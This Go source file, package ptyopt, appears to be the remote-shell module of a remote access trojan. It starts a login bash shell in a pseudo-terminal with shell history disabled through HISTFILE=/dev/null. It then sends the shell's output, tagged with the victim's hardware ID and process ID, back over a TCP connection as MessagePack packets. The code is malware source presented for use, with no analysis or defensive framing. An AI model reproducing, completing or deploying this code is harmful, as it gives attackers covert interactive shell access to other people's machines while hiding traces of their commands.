package ptyopt

import (
	"io"
	"main/MessagePack"
	"main/PcInfo"
	"main/TCPsocket"
	"net"
	"os"
	"os/exec"

	"github.com/creack/pty"
)

type PtyData struct {
	Stdin  io.WriteCloser
	Stdout io.ReadCloser
}

func InitPtmx() *os.File {
	ws, _ := pty.GetsizeFull(os.Stdin)
	c := exec.Command("/bin/sh", "-c", "exec bash --login")
	c.Env = []string{"HISTFILE=/dev/null"}
	ptmx, err := pty.Start(c)

	if err != nil {
		return nil
	}
	_ = pty.Setsize(ptmx, ws)
	return ptmx
}
func RetPtyResult(resBuffer []byte, clientId string, Connection net.Conn) {
	//fmt.Println(string(resBuffer))
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("PtyRet")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ClientHWID").SetAsString(PcInfo.GetHWID())
	msgpack.ForcePathObject("Message").SetAsString(string(resBuffer))
	//fmt.Println(string(resBuffer))
	TCPsocket.Send(Connection, msgpack.Encode2Bytes())
}
